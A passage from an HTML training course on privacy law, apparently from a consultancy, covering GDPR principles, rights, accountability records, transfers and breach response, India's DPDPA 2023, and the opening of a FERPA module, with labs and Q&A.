information relating to an identified or identifiable natural person — name, email, phone, IP address, cookie/device ID, location, an online identifier. Broader than most people assume.</li><li><strong>Special category data (Article 9): </strong>racial/ethnic origin, political opinions, religious/philosophical beliefs, trade-union membership, genetic data, biometric data for identification, health, sex life/orientation. Processing is prohibited unless an Article 9 condition applies (explicit consent, employment law, vital interests, etc.) — on top of an Article 6 basis.</li><li><strong>Processing: </strong>almost anything done with data — collecting, recording, storing, using, sharing, erasing.</li><li><strong>Data subject: </strong>the living individual the data is about.</li><li><strong>Controller: </strong>the entity that determines the purposes and means of processing.</li><li><strong>Processor: </strong>the entity that processes on the controller's behalf and instructions.</li><li><strong>Joint controllers (Article 26): </strong>two controllers jointly determining purposes/means; they need a transparent arrangement defining responsibilities.</li><li><strong>Pseudonymisation vs anonymisation: </strong>pseudonymised data can be re-linked with a key and is STILL personal data; truly anonymised data (irreversible) falls outside GDPR. The distinction matters constantly.</li></ul><h1 id=\"sec2\">2. The Seven Principles (Article 5)</h1><p>Everything in GDPR flows from seven principles. The controller must comply with all of them and be able to demonstrate it (the seventh).</p><div class=\"tbl-wrap\"><table><thead><tr><th>Principle</th><th>What it forces you to do</th><th>Common failure</th></tr></thead><tbody><tr><td>Lawfulness, fairness, transparency</td><td>Have a lawful basis; tell people clearly</td><td>Vague or missing privacy notice</td></tr><tr><td>Purpose limitation</td><td>Use data only for the stated purpose</td><td>Re-using data for new purposes</td></tr><tr><td>Data minimisation</td><td>Collect only what's necessary</td><td>Collecting 'just in case'</td></tr><tr><td>Accuracy</td><td>Keep data correct; rectify/erase</td><td>Stale records driving decisions</td></tr><tr><td>Storage limitation</td><td>Keep no longer than necessary</td><td>Indefinite retention</td></tr><tr><td>Integrity &amp; confidentiality</td><td>Secure data (Article 32)</td><td>No encryption / weak access control</td></tr><tr><td>Accountability</td><td>Demonstrate compliance</td><td>No RoPA, no DPIAs, no records</td></tr></tbody></table></div><h2>2.1 The six lawful bases (Article 6) — choosing the right one</h2><p>You need at least one lawful basis before processing. Choosing well matters: consent is the weakest because it can be withdrawn; a more stable basis is often better.</p><ul><li><strong>Consent </strong>— freely given, specific, informed, unambiguous opt-in; withdrawable. Best for marketing and optional features.</li><li><strong>Contract </strong>— processing necessary to perform a contract with the data subject (e.g. shipping an order). Sturdy for core service delivery.</li><li><strong>Legal obligation </strong>— required by law (tax, AML, employment records).</li><li><strong>Vital interests </strong>— to protect someone's life (rare, emergencies).</li><li><strong>Public task </strong>— official authority/public interest (mostly public bodies).</li><li><strong>Legitimate interests </strong>— your (or a third party's) genuine interest, balanced against the data subject's rights. Requires a documented Legitimate Interests Assessment (LIA): purpose test (is there a real interest?), necessity test (is processing needed?), balancing test (do the individual's rights override?).</li></ul><div class=\"callout warn\"><div class=\"callout-title\">Valid consent (Article 7) — done right vs wrong</div><p><strong>Wrong: </strong>pre-ticked boxes; “by using this site you agree to everything”; bundling consent so users must “accept all or get no service.” <strong>Right: </strong>an unticked, granular opt-in per purpose; plain language; as easy to withdraw as to give; and you can prove who consented to what, and when. For cookies/trackers, non-essential ones must NOT fire before consent (the ePrivacy rule that sits alongside GDPR).</p></div><h1 id=\"sec3\">3. Data-Subject Rights and How to Operationalise Them</h1><p>GDPR grants eight rights. Controllers must facilitate them and generally respond within one month, free of charge (extendable to three months for complex requests, with notice).</p><div class=\"tbl-wrap\"><table><thead><tr><th>Right (Article)</th><th>What the person can do</th><th>Operational requirement</th></tr></thead><tbody><tr><td>Information (13/14)</td><td>Be told what &amp; why</td><td>Layered privacy notice at collection</td></tr><tr><td>Access — DSAR (15)</td><td>Get a copy of their data</td><td>Search all systems; respond in 1 month</td></tr><tr><td>Rectification (16)</td><td>Correct inaccurate data</td><td>Edit workflow + propagate to processors</td></tr><tr><td>Erasure (17)</td><td>'Right to be forgotten'</td><td>Delete where basis ends; cascade to backups/vendors</td></tr><tr><td>Restriction (18)</td><td>Pause processing</td><td>Flag + hold during disputes</td></tr><tr><td>Portability (20)</td><td>Export in machine-readable form</td><td>Structured export (JSON/CSV)</td></tr><tr><td>Object (21)</td><td>Object to processing</td><td>Stop; for direct marketing it's absolute</td></tr><tr><td>Automated decisions (22)</td><td>Avoid solely-automated decisions</td><td>Human review for legal/significant effects</td></tr></tbody></table></div><h2>3.1 The DSAR workflow (the one clients fail most)</h2><ol><li><strong>Log &amp; acknowledge </strong>the request; start the one-month clock immediately.</li><li><strong>Verify identity </strong>proportionately — enough to be sure, without over-collecting.</li><li><strong>Search every system </strong>using your data map: CRM, support tickets, email, logs, backups, analytics, third-party processors.</li><li><strong>Redact third-party data </strong>and apply any exemptions (e.g. legal privilege); compile the response.</li><li><strong>Deliver securely </strong>in an accessible format; record what was provided and when.</li></ol><p><strong>Why a data map is non-negotiable: </strong>you cannot honour access/erasure or report a breach in time if you don't know where personal data lives. The data map (and its formal cousin, the RoPA) is the foundation of operational GDPR compliance.</p><h1 id=\"sec4\">4. Accountability Artifacts (Build These)</h1><h2>4.1 RoPA — Records of Processing Activities (Article 30)</h2><p>An inventory of every processing activity. Required for most organisations. The fields, with a worked row:</p><div class=\"tbl-wrap\"><table><thead><tr><th>RoPA field</th><th>Example value</th></tr></thead><tbody><tr><td>Processing activity</td><td>Customer support ticketing</td></tr><tr><td>Purpose</td><td>Resolve user issues</td></tr><tr><td>Lawful basis</td><td>Contract</td></tr><tr><td>Data categories</td><td>Name, email, message content</td></tr><tr><td>Data-subject categories</td><td>Customers</td></tr><tr><td>Recipients</td><td>Zendesk (processor, EU region)</td></tr><tr><td>Retention period</td><td>24 months after ticket close</td></tr><tr><td>International transfers</td><td>None outside EEA</td></tr><tr><td>Security measures</td><td>Encryption, RBAC, MFA, logging</td></tr></tbody></table></div><h2>4.2 DPIA — Data Protection Impact Assessment (Article 35)</h2><p>A DPIA is required before high-risk processing. You must do one for: systematic and extensive profiling with significant effects; large-scale special-category processing; or systematic large-scale monitoring of public areas. Many authorities publish lists of operations always requiring a DPIA.</p><p><strong>DPIA contents: </strong>(1) a systematic description of the processing and purposes; (2) an assessment of necessity and proportionality; (3) an assessment of the risks to data subjects' rights and freedoms; (4) the measures to address those risks. If, after mitigation, high residual risk remains, you must consult the supervisory authority before proceeding (Article 36).</p><h2>4.3 Roles and contracts</h2><ul><li><strong>DPO (Articles 37–39): </strong>a Data Protection Officer is mandatory for public authorities, or where core activities involve large-scale systematic monitoring or large-scale special-category data. The DPO must be independent, expert, report to the highest management, and not be penalised for doing the job.</li><li><strong>DPA — Data Processing Agreement (Article 28): </strong>a mandatory contract between controller and processor covering subject-matter, duration, purpose, data types, the controller's instructions, confidentiality, security, sub-processor approval, assistance with rights/breaches, deletion/return at end, and audit rights.</li><li><strong>Privacy by Design and by Default (Article 25): </strong>bake protection into systems from the start (e.g. pseudonymisation, minimisation) and default to the most privacy-protective settings (e.g. profiles private by default).</li></ul><h1 id=\"sec5\">5. International Transfers and Breach Response</h1><h2>5.1 Transfers outside the EEA (Chapter V)</h2><p>Transferring EU personal data abroad needs a valid transfer mechanism:</p><ul><li><strong>Adequacy decision: </strong>the destination country is deemed by the EU to provide adequate protection (e.g. the UK, Japan, and the EU–US Data Privacy Framework for certified US firms). No extra steps.</li><li><strong>Standard Contractual Clauses (SCCs): </strong>EU-approved contract clauses between exporter and importer — the workhorse for most transfers.</li><li><strong>Binding Corporate Rules (BCRs): </strong>approved intra-group rules for multinationals.</li></ul><p><strong>Post Schrems II: </strong>in addition to SCCs you must run a Transfer Impact Assessment (TIA) checking whether the destination's surveillance laws undermine the protection, and add supplementary measures (e.g. strong encryption with keys held in the EU) where needed. India has no EU adequacy decision, so EU→India transfers typically rely on SCCs + a TIA + technical measures.</p><h2>5.2 The breach runbook (Articles 33 &amp; 34)</h2><p><strong>A personal data breach </strong>is a breach of security leading to accidental or unlawful destruction, loss, alteration, or unauthorised disclosure of or access to personal data.</p><ol><li><strong>Detect &amp; contain </strong>— the clock starts when you become “aware” of the breach.</li><li><strong>Assess risk to individuals </strong>— what data, how many people, likelihood and severity of harm.</li><li><strong>Notify the supervisory authority within 72 hours </strong>— unless the breach is unlikely to result in a risk to individuals' rights (document why if you don't notify).</li><li><strong>Notify affected individuals without undue delay </strong>— if the breach is likely to result in a HIGH risk to them.</li><li><strong>Record every breach </strong>in a breach register — even those you decide not to report — with facts, effects, and remedial action.</li></ol><div class=\"callout warn\"><div class=\"callout-title\">72 hours is impossible without preparation</div><p>You cannot meet a 72-hour deadline reactively. You need: a tested incident-response plan, a breach register, pre-drafted notification templates, and a data map so you can scope impact fast. Because the clock starts at “awareness,” your detection and triage speed directly determine compliance. This is exactly where the security controls from Module 1 and privacy obligations meet.</p></div><h1 id=\"sec6\">6. Enforcement, Real Cases, Labs, and Q&amp;A</h1><h2>6.1 Enforcement structure and fines</h2><ul><li><strong>Two tiers of fines: </strong>up to €10M or 2% turnover for lesser infringements (e.g. records, security); up to €20M or 4% turnover for core breaches (principles, lawful basis, rights, transfers).</li><li><strong>Supervisory authorities </strong>(Ireland's DPC, France's CNIL, Germany's state DPAs, etc.) investigate and fine; the lead-authority/one-stop-shop mechanism coordinates cross-border cases.</li></ul><h2>6.2 Landmark fines (themes, not trivia)</h2><ul><li><strong>Meta / Ireland (2023) — ~€1.2 billion: </strong>unlawful EU→US data transfers; the largest GDPR fine to date. Theme: transfers.</li><li><strong>Amazon / Luxembourg (2021) — ~€746 million: </strong>advertising/consent practices. Theme: consent &amp; transparency.</li><li><strong>Google / CNIL France (2019) — €50 million: </strong>insufficient transparency and invalid consent for ad personalisation. Theme: consent &amp; notice.</li></ul><p>The recurring causes are invalid consent, unlawful transfers, and lack of transparency — not exotic hacks. Most GDPR risk is in how you obtain and document consent and how you move data, not in a firewall.</p><h2>6.3 Labs</h2><div class=\"callout info\"><div class=\"callout-title\">Lab 1 — Choose the lawful basis (30 min)</div><p>For each, pick the basis and justify: (a) sending order confirmations; (b) sending marketing newsletters; (c) fraud detection on transactions; (d) retaining invoices for 7 years. (Answers: contract; consent; legitimate interests with an LIA; legal obligation.)</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 2 — Run a DSAR (45 min)</div><p>Map where a single customer's data would live across a typical SaaS. Write the identity-verification step (proportionate), list what you'd redact, and define the secure-delivery method. Note any system you'd struggle to search — that's your compliance gap.</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 3 — Breach decision (30 min)</div><p>A laptop with a fully-encrypted disk holding 5,000 customer records is stolen; the key was not exposed. Do you notify the authority? Affected individuals? Justify using the risk test. (Likely low risk due to strong encryption — but document the assessment and log the breach regardless.)</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 4 — Draft a DPIA outline (45 min)</div><p>Your client wants to add AI-driven profiling to recommend products using behavioural data. Draft a DPIA outline covering the four required elements and identify two mitigations that would reduce residual risk.</p></div><h2>6.4 Q&amp;A</h2><ul><li><strong>Q: Recite the seven principles. </strong>A: Lawfulness/fairness/transparency; purpose limitation; minimisation; accuracy; storage limitation; integrity &amp; confidentiality; accountability.</li><li><strong>Q: When does GDPR apply to a non-EU company? </strong>A: When it offers goods/services to, or monitors the behaviour of, people in the EU (Article 3).</li><li><strong>Q: DSAR deadline and cost? </strong>A: One month, free (extendable to three for complex requests, with notice).</li><li><strong>Q: Breach timelines? </strong>A: 72 hours to the authority (unless no risk); without undue delay to individuals if high risk.</li><li><strong>Q: How can an Indian firm lawfully receive EU data? </strong>A: SCCs + a Transfer Impact Assessment + supplementary measures (e.g. encryption).</li><li><strong>Q: When is a DPIA required? </strong>A: High-risk processing — large-scale profiling with significant effects, large-scale special-category data, or systematic public monitoring.</li><li><strong>Q: When must you appoint a DPO? </strong>A: Public authority, or core activities of large-scale systematic monitoring or large-scale special-category processing.</li></ul><div class=\"callout info\"><div class=\"callout-title\">Mastery check</div><p>1. Map four processing activities to lawful bases with justification.</p><p>2. Build a RoPA row and a DPIA outline.</p><p>3. Run a DSAR end to end and identify your weakest searchable system.</p><p>4. Execute the 72-hour breach runbook with a documented risk decision.</p><p>5. Explain lawful EU→India transfer post-Schrems II.</p><p>6. State the two fine tiers and the themes behind the biggest fines.</p></div>","sections":[{"id":"sec1","title":"1. What GDPR Is and Why It Reaches India"},{"id":"sec2","title":"2. The Seven Principles (Article 5)"},{"id":"sec3","title":"3. Data-Subject Rights and How to Operationalise Them"},{"id":"sec4","title":"4. Accountability Artifacts (Build These)"},{"id":"sec5","title":"5. International Transfers and Breach Response"},{"id":"sec6","title":"6. Enforcement, Real Cases, Labs, and Q&A"}]},{"id":"05","navTitle":"DPDPA 2023","title":"DPDPA 2023","subtitle":"India's Digital Personal Data Protection Act","html":"<h1 id=\"sec1\">1. The DPDPA in Context</h1><p><strong>The Digital Personal Data Protection Act, 2023 (DPDPA)</strong> is India's first comprehensive, standalone data-protection law, enacted in August 2023 after years of drafts (the 2018 Srikrishna Committee bill, the 2019 PDP Bill, the 2022 draft). It governs <strong>digital personal data</strong> — personal data collected in digital form, or collected on paper and subsequently digitised. For SRXLABS this is the single most commercially relevant privacy law for Indian clients, and demand for DPDPA readiness work is rising fast.</p><div class=\"callout warn\"><div class=\"callout-title\">Status — always re-verify before advising a client</div><p>The Act was passed in 2023, but most operational detail (timelines, thresholds, Consent Manager registration, Significant Data Fiduciary criteria) comes from the DPDP Rules and a phased, government-notified commencement — with the Data Protection Board and various obligations being switched on in stages. Before any engagement, confirm the current Rules and what has actually commenced. This module reflects the Act as enacted and the consultative Rules direction.</p></div><h2>1.1 Scope and exclusions</h2><ul><li><strong>Applies to: </strong>processing of digital personal data within India; and processing OUTSIDE India where it is connected with offering goods or services to Data Principals in India (an extraterritorial hook similar to GDPR).</li><li><strong>Does not apply to: </strong>personal data processed by an individual for purely personal or domestic purposes; and personal data the individual has made publicly available, or that is made public under a legal obligation.</li><li><strong>No separate 'sensitive data' tier </strong>like GDPR's Article 9 — a notable simplification — though children's data and certain processing carry extra duties.</li></ul><h2>1.2 Design philosophy — consent-centric with carve-outs</h2><p>DPDPA is built around consent as the primary basis, softened by a defined set of “legitimate uses” where consent is not separately required. It deliberately favours plain-language notices, a digital-first regulator (the Data Protection Board), and a Consent Manager ecosystem — a uniquely Indian construct — to let individuals manage consent across services from one place.</p><h1 id=\"sec2\">2. Roles, Definitions, and the Regulator</h1><div class=\"tbl-wrap\"><table><thead><tr><th>DPDPA term</th><th>GDPR analogue</th><th>Meaning / core duty</th></tr></thead><tbody><tr><td>Data Principal</td><td>Data subject</td><td>The individual; if a child, the parent/guardian acts</td></tr><tr><td>Data Fiduciary</td><td>Controller</td><td>Decides purpose &amp; means; the primary duty-bearer</td></tr><tr><td>Data Processor</td><td>Processor</td><td>Processes for a Fiduciary, under a valid contract</td></tr><tr><td>Significant Data Fiduciary (SDF)</td><td>(no direct match)</td><td>Govt-designated by scale/risk; extra duties</td></tr><tr><td>Consent Manager</td><td>(novel to India)</td><td>A registered platform to give, manage, withdraw consent</td></tr><tr><td>Data Protection Board (DPB)</td><td>Supervisory authority</td><td>Digital-first body that investigates &amp; penalises</td></tr></tbody></table></div><h2>2.1 Significant Data Fiduciaries (SDFs)</h2><p>The government may classify certain Data Fiduciaries as “Significant” based on the volume and sensitivity of data, risk to Data Principals' rights, potential effects on the sovereignty and integrity of India, risk to electoral democracy, security of the State, and public order. SDFs carry extra obligations:</p><ul><li>Appoint a Data Protection Officer based in India, answerable to the board of directors.</li><li>Appoint an independent data auditor to evaluate compliance.</li><li>Conduct periodic Data Protection Impact Assessments and audits, and other measures the government prescribes (e.g. algorithmic-fairness checks).</li></ul><p><strong>Practical step: </strong>assess early whether a client is likely to be designated an SDF — a large consumer platform, a major fintech, or a data-broker is a candidate — because the DPO + audit + DPIA obligations materially change the engagement scope.</p><h2>2.2 The Data Protection Board of India</h2><ul><li>A digital-by-design adjudicatory body: complaints, investigations, hearings, and penalties are intended to run largely online.</li><li>It can direct remedial or mitigation measures during a breach and impose monetary penalties.</li><li>Appeals from the Board lie to the Telecom Disputes Settlement and Appellate Tribunal (TDSAT).</li></ul><h1 id=\"sec3\">3. Notice, Consent, and Legitimate Uses</h1><h2>3.1 Notice — the mandatory contents</h2><p>Before or at the time of requesting consent, the Data Fiduciary must give an itemised notice in clear, plain language, available in English and the languages of the Eighth Schedule to the Constitution.</p><pre class=\"code\"><code>DPDPA NOTICE — required elements\n 1. WHAT personal data will be collected (itemised, not vague)\n 2. The PURPOSE for which it will be processed (specific)\n 3. HOW the Data Principal may exercise their rights\n 4. HOW to withdraw consent (and that it's as easy as giving it)\n 5. HOW to make a complaint to the Data Protection Board</code></pre><h2>3.2 Consent — the standard</h2><ul><li>Free, specific, informed, unconditional, and unambiguous, given by a clear affirmative action.</li><li>Limited to the personal data necessary for the specified purpose (built-in minimisation).</li><li>Withdrawable at any time, with the ease of withdrawal equal to the ease of giving it. On withdrawal, processing must stop and data be erased unless retention is legally required.</li><li>May be given, managed, reviewed, and withdrawn through a registered Consent Manager, who is accountable to the Data Principal.</li></ul><h2>3.3 Legitimate uses (consent not separately required)</h2><p>DPDPA defines specific “legitimate uses” — a narrower, enumerated list compared to GDPR's open-ended legitimate-interests basis. Key ones:</p><ul><li>The Data Principal voluntarily provided data for a specified purpose and has not indicated they object.</li><li>For the State (or its instrumentalities) to provide a subsidy, benefit, service, certificate, licence, or permit.</li><li>For compliance with a law or a judgment; for responding to a medical emergency or threat to life/health; during epidemics or disasters; and for specified employment-related purposes.</li></ul><div class=\"callout info\"><div class=\"callout-title\">Consent vs legitimate use — the practical test</div><p>Ask: is this processing part of delivering something the person actively asked for (often a legitimate use), or is it additional/optional (needs consent)? An OTP to log in is a legitimate use; marketing messages need consent. Misclassifying optional processing as a “legitimate use” to avoid consent is a common and risky mistake.</p></div><h1 id=\"sec4\">4. Duties, Rights, and Children's Data</h1><h2>4.1 Duties of the Data Fiduciary</h2><ul><li>Process only for the consented or legitimate-use purpose; ensure accuracy where data is used to make decisions affecting the Data Principal or is shared.</li><li>Implement reasonable security safeguards to prevent a personal data breach — reuse the ISO 27001 control set (encryption, access control, logging, monitoring).</li><li>Erase data on withdrawal of consent or when the purpose is no longer being served, unless retention is required by law; ensure processors do the same.</li><li>Notify the Data Protection Board and each affected Data Principal of any personal data breach, in the manner and within the timelines prescribed by the Rules.</li><li>Engage processors only under a valid contract; the Fiduciary remains accountable for the processor's compliance.</li><li>Publish the contact details of a DPO (for SDFs) or a person able to answer questions about processing; establish a grievance-redressal mechanism.</li></ul><h2>4.2 Rights and duties of the Data Principal</h2><ul><li><strong>Right to access </strong>a summary of personal data being processed and the processing activities, and the identities of any other Fiduciaries/Processors with whom it has been shared.</li><li><strong>Right to correction, completion, updating, and erasure </strong>of personal data.</li><li><strong>Right to grievance redressal </strong>— the Fiduciary/Consent Manager must provide a readily available means; escalate to the Board if unresolved.</li><li><strong>Right to nominate </strong>another individual to exercise rights in the event of death or incapacity.</li><li><strong>Duties of the Data Principal (a DPDPA novelty): </strong>not to register false or frivolous grievances, not to impersonate, and not to suppress material information. Breaching these can attract a penalty on the individual.</li></ul><h2>4.3 Children's data (under 18)</h2><ul><li>Verifiable consent of a parent or lawful guardian is required before processing a child's personal data.</li><li><strong>Prohibited: </strong>tracking or behavioural monitoring of children, targeted advertising directed at children, and any processing likely to cause a detrimental effect on a child's wellbeing.</li><li>Similar protections apply to persons with disabilities who have a lawful guardian.</li></ul><div class=\"callout info\"><div class=\"callout-title\">Edtech example — the classic India trap</div><p>An edtech app serving school students must verify parental consent, must not behaviourally track or profile minors, and must not serve targeted ads to them. A free “games + ads” model aimed at under-18s breaches the Act. An SRXLABS engagement would redesign the consent flow (verifiable parental consent), disable ad-tracking on minor accounts, and restrict processing to what's needed to deliver the learning service.</p></div><h1 id=\"sec5\">5. Penalties, Transfers, and the Client Playbook</h1><h2>5.1 Penalties (per the Schedule)</h2><p>Penalties are substantial and are set by the Board considering the nature, gravity, duration, and repetitive nature of the breach, and any gain or loss. Headline figures:</p><div class=\"tbl-wrap\"><table><thead><tr><th>Failure</th><th>Penalty (up to)</th></tr></thead><tbody><tr><td>Failure to take reasonable security safeguards (breach prevention)</td><td>₹250 crore</td></tr><tr><td>Failure to notify the Board / Data Principals of a breach</td><td>₹200 crore</td></tr><tr><td>Breach of children's-data obligations</td><td>₹200 crore</td></tr><tr><td>Breach of additional SDF obligations</td><td>₹150 crore</td></tr><tr><td>Breach of Data Principal duties (on the individual)</td><td>Up to ₹10,000</td></tr><tr><td>Other breaches of the Act/Rules</td><td>₹50 crore</td></tr></tbody></table></div><h2>5.2 Cross-border transfers</h2><p><strong>DPDPA uses a 'blocklist' (negative-list) model: </strong>transfers of personal data outside India are generally permitted, EXCEPT to countries or territories the Central Government specifically restricts by notification. This is the inverse of GDPR's 'allowlist' (adequacy/SCCs) approach. Note: sector regulators impose stricter rules on top — e.g. the RBI's payment-data localisation mandate requires certain payment data to be stored only in India. Always layer sectoral localisation over the DPDPA baseline.</p><h2>5.3 Lead-implementer playbook for a client</h2><ol><li><strong>Data mapping: </strong>inventory all personal data — what is collected, why, where stored, who it is shared with, and retention. Flag any children's data.</li><li><strong>Basis review: </strong>classify each processing activity as consent or a defined legitimate use; remove anything with no valid basis.</li><li><strong>Rebuild notice &amp; consent: </strong>itemised, plain-language, multi-language notices; granular, withdrawable consent; consider integrating a Consent Manager.</li><li><strong>Rights handling: </strong>build access/correction/erasure/nomination workflows; appoint a grievance officer with response SLAs.</li><li><strong>Security safeguards: </strong>map to ISO 27001 controls — encryption, RBAC, MFA, logging, monitoring, secure deletion.</li><li><strong>Breach response: </strong>incident-response plan with Board-notification and Data-Principal-notification templates and a breach register.</li><li><strong>SDF assessment: </strong>evaluate whether the client is (or will be designated) a Significant Data Fiduciary; if so, add DPO, independent audit, and DPIA.</li><li><strong>Processor contracts: </strong>put valid DPDPA-compliant processing contracts in place with every vendor handling personal data.</li></ol><h1 id=\"sec6\">6. GDPR↔DPDPA Delta, Labs, and Q&amp;A</h1><h2>6.1 Key differences (don't assume GDPR work = DPDPA done)</h2><div class=\"tbl-wrap\"><table><thead><tr><th>Topic</th><th>GDPR</th><th>DPDPA</th></tr></thead><tbody><tr><td>Lawful bases</td><td>Six bases incl. open legitimate interests</td><td>Consent + a defined list of 'legitimate uses'</td></tr><tr><td>Sensitive data</td><td>Special category (Article 9)</td><td>No separate tier</td></tr><tr><td>Transfers</td><td>Allowlist (adequacy / SCCs / TIA)</td><td>Blocklist (allowed except restricted countries)</td></tr><tr><td>Consent infrastructure</td><td>Self-managed</td><td>Consent Manager mechanism (registered)</td></tr><tr><td>Individual duties</td><td>None</td><td>Duties + penalties on Data Principals</td></tr><tr><td>Children</td><td>Age 13–16 (varies by state)</td><td>Under 18; no targeted ads / tracking</td></tr><tr><td>Regulator</td><td>National DPAs + one-stop-shop</td><td>Single Data Protection Board (digital-first)</td></tr></tbody></table></div><h2>6.2 Labs</h2><div class=\"callout info\"><div class=\"callout-title\">Lab 1 — Write a compliant notice (30 min)</div><p>Draft a DPDPA notice for a fintech app collecting name, phone, PAN, and transaction history for KYC and fraud detection. Include all five required elements and note which processing is a legitimate use vs consent-based.</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 2 — Consent vs legitimate use (30 min)</div><p>Classify each: (a) OTP to log in; (b) promotional SMS; (c) processing salary for an employee; (d) sharing data to deliver a government subsidy; (e) recommending products from browsing history. (Answers: legitimate use; consent; legitimate use/legal; legitimate use; consent.)</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 3 — Children's-data redesign (45 min)</div><p>An edtech app profiles students for 'personalised ads.' List every change needed to comply, and specify what data it can still process to deliver the core learning service.</p></div><div class=\"callout info\"><div class=\"callout-title\">Lab 4 — SDF gap assessment (45 min)</div><p>For a 5-million-user consumer app, argue whether it's likely to be designated an SDF, and list the additional obligations and the artefacts (DPO appointment letter, audit scope, DPIA template) you'd put in place.</p></div><h2>6.3 Q&amp;A</h2><ul><li><strong>Q: Map the four DPDPA roles to GDPR. </strong>A: Data Principal = subject; Data Fiduciary = controller; Data Processor = processor; Data Protection Board = supervisory authority.</li><li><strong>Q: What makes consent valid under DPDPA? </strong>A: Free, specific, informed, unconditional, unambiguous, by clear affirmative action, limited to the purpose, and withdrawable.</li><li><strong>Q: Children's-data rules? </strong>A: Verifiable parental consent; no behavioural tracking, no targeted ads, no harmful processing of minors.</li><li><strong>Q: Transfer model vs GDPR? </strong>A: Blocklist (allowed except to restricted countries) vs GDPR's allowlist; sectoral localisation (e.g. RBI) stacks on top.</li><li><strong>Q: Extra SDF duties? </strong>A: India-based DPO, independent data auditor, periodic DPIA and audits.</li><li><strong>Q: Largest penalty exposure? </strong>A: Up to ₹250 crore for failing to take reasonable security safeguards to prevent a breach.</li><li><strong>Q: What's novel about DPDPA vs other laws? </strong>A: The Consent Manager ecosystem and explicit duties (with penalties) on Data Principals.</li></ul><div class=\"callout info\"><div class=\"callout-title\">Mastery check</div><p>1. Draft a compliant notice with all five elements.</p><p>2. Classify activities as consent vs legitimate use.</p><p>3. State the children's-data prohibitions and redesign an edtech flow.</p><p>4. Explain the blocklist transfer model and where RBI localisation stacks on.</p><p>5. List SDF duties and the major penalty exposures.</p><p>6. Walk the client playbook from data mapping to processor contracts.</p></div>","sections":[{"id":"sec1","title":"1. The DPDPA in Context"},{"id":"sec2","title":"2. Roles, Definitions, and the Regulator"},{"id":"sec3","title":"3. Notice, Consent, and Legitimate Uses"},{"id":"sec4","title":"4. Duties, Rights, and Children's Data"},{"id":"sec5","title":"5. Penalties, Transfers, and the Client Playbook"},{"id":"sec6","title":"6. GDPR↔DPDPA Delta, Labs, and Q&A"}]},{"id":"06","navTitle":"FERPA","title":"FERPA","subtitle":"US Education Records Privacy","html":"<h1 id=\"sec1\">1. What FERPA Is and Why It Reaches You</h1><p><strong>The Family Educational Rights and Privacy Act (FERPA)</strong>, enacted in 1974 (also called the Buckley Amendment), is the US federal law protecting the privacy of <strong>student education records</strong>. It applies to every educational agency or institution that receives funds under a programme of the US Department of Education — in practice almost all US public schools, school districts, colleges, and universities. The ultimate sanction is loss of federal funding (rare but existential); the practical teeth are contractual termination, vendor bans, and state-law liability.</p><div class=\"callout info\"><div class=\"callout-title\">The vendor hook — why an Indian cybersecurity firm cares</div><p>FERPA binds the institution, and institutions push those obligations contractually onto their technology vendors via the 'school official' exception. If SRXLABS or a client builds edtech, a learning-management system, a student-information system, or any SaaS used by US schools or universities, FERPA obligations land on you through the contract. Edtech selling into US education cannot ignore it — and FERPA-readiness is a sellable advisory service.</p></div><h2>1.1 Who holds the rights</h2><ul><li><strong>Parents </strong>hold the rights while the student is a minor and in K-12.</li><li><strong>Eligible student </strong>— rights transfer to the student at age 18 OR when they enrol in a post-secondary institution (college), whichever comes first. After transfer, the institution generally cannot share records with parents without the student's written consent — even if the parent pays tuition.</li></ul><h2>1.2 Enforcement</h2><p>FERPA is enforced by the US Department of Education's Student Privacy Policy Office (SPPO). It investigates complaints and works with institutions to achieve voluntary compliance; in egregious, unremedied cases it can withhold federal funding. There is no private right of action under FERPA itself (confirmed by the US Supreme Court in Gonzaga v. Doe, 2002) — individuals can't sue for damages directly under FERPA — but state privacy and contract laws frequently provide the actual liability route, which is why vendor contracts carry the real risk.</p><h1 id=\"sec2\">2. What Counts as an Education Record</h1><p>Scope hinges on the definition of “education records.” Getting the boundaries right is most of FERPA practice.</p><h2>2.1 Covered records</h2><ul><li>Records directly related to a student AND maintained by the institution or a party acting for it: grades, transcripts, GPA, class schedules, disciplinary records, special-education (IEP) records, financial-aid and billing records, and most personally identifiable information tied to a student.</li></ul><h2>2.2 Excluded records (these distinctions are tested)</h2><div class=\"tbl-wrap\"><table><thead><tr><th>Excluded record</th><th>Why excluded</th></tr></thead><tbody><tr><td>Sole-possession records</td><td>A teacher's private notes, kept only by the maker, not shared</td></tr><tr><td>Law-enforcement unit records</td><td>Created and kept by a school's police/security unit for LE purposes</td></tr><tr><td>Employment records</td><td>Where the person is employed and not enrolled as a student</td></tr><tr><td>Medical/treatment records (eligible students)</td><td>Covered by other regimes (e.g. used only for treatment)</td></tr><tr><td>Post-attendance / alumni records</td><td>Created after the person is no longer a student</td></tr></tbody></table></div><h2>2.3 Directory information</h2><p><strong>Directory information </strong>— typically name, address, telephone, email, dates of attendance, enrolment status, degrees and awards, and photographs — may be disclosed WITHOUT consent, but only if the institution: (1) publicly defines what it treats as directory information; and (2) gives parents/eligible students a reasonable chance to opt out. A misconfigured “public” directory or portal that exposes more than the defined fields (or exposes data for students who opted out) is a classic, common violation.</p><p><strong>Vendor implication: </strong>if your product surfaces any student data publicly or to other users, you must respect the institution's directory-information definition and opt-outs precisely. Defaulting to “public profiles” for students is a FERPA landmine.</p><h1 id=\"sec3\">3. Rights and the Consent Rule</h1><h2>3.1 The rights FERPA grants</h2><ul><li><strong>Inspect and review </strong>the student's education records — the institution must respond within 45 days of a request.</li><li><strong>Request amendment </strong>of records the parent/eligible student believes are inaccurate or misleading; if refused, the right to a hearing and to add a statement to the record.</li><li><strong>Control disclosure </strong>of personally identifiable information from education records — written consent is generally required before disclosure.</li><li><strong>File a complaint </strong>with the Department of Education's Student Privacy Policy Office.</li></ul><h2>3.2 The consent rule and its key exceptions</h2><p>The default is: get prior written consent before disclosing PII from education records. But FERPA enumerates exceptions where consent is NOT required:</p><ul><li><strong>School officials with a legitimate educational interest </strong>— including contractors/vendors who act as school officials under the institution's control (the exception that makes edtech possible).</li><li><strong>Other schools </strong>to which a student seeks to transfer.</li><li>Specified officials for audit/evaluation; financial-aid purposes; accrediting organisations; organisations conducting studies for the institution.</li><li>Judicial orders and lawfully issued subpoenas; health and safety emergencies; and directory information (where an opt-out policy exists).</li></ul><div class=\"callout warn\"><div class=\"callout-title\">The 'school official' exception — your contractual basis as a 